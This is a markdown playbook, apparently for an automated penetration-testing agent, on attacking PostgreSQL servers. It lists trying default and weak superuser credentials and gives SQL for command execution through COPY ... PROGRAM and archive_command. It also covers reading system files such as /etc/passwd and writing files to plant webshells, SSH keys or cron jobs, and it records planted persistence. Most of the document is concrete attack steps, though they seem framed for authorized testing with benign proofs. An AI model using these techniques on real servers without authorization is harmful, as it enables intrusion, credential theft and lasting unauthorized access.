---
name: postgresql
services: [postgresql, postgres]
summary: PostgreSQL — weak/default creds, COPY...PROGRAM RCE, file read/write, archive_command
---

# PostgreSQL playbook

Connect with the `psql` client via `local_exec` (or `run_script` with a driver for scripted
queries). The commands below are **examples** — compose your own from what you find.

## Connecting
The default superuser is `postgres`; blank/weak passwords and `postgres:postgres` are common.
- Example: `local_exec("PGPASSWORD=<pw> psql -h <host> -U postgres -c 'SELECT version();'")`

look for: a login that works, and whether it's a superuser (next — superuser unlocks exec).

## Privilege & orient
- Example: `SELECT current_user, session_user; SELECT usesuper FROM pg_user WHERE usename = current_user;`
- Example (databases/tables): `\l` then `\dt`, or `SELECT datname FROM pg_database;`

look for: `usesuper = t` → COPY PROGRAM exec and file read/write below.

## RCE via COPY ... PROGRAM (superuser, PG 9.3+)
PostgreSQL can pipe a table to/from an OS program — a direct command-exec primitive.
- Example (run + read back): `CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;`
- Example (one-shot): `COPY (SELECT '') TO PROGRAM 'id > /tmp/o';`

look for: COPY PROGRAM succeeds → code-exec finding (critical; prove with a benign `id`/`whoami`).

## File read / write (superuser)
- Example (read): `SELECT pg_read_file('/etc/passwd');`
- Example (write): COPY TO an arbitrary path (or a large-object export) → then convert per the
  foothold methodology (webshell / SSH key / cron)

look for: readable secrets/keys; a writable path the system acts on.

## archive_command RCE (alternate)
If COPY PROGRAM is blocked: `ALTER SYSTEM SET archive_command = '<cmd>';` runs on WAL archive
(needs a config reload / checkpoint to fire).

## Record
`record_credential` for creds in tables/config. Code-exec or file read/write = critical
(benign proof). `record_persistence` anything planted.
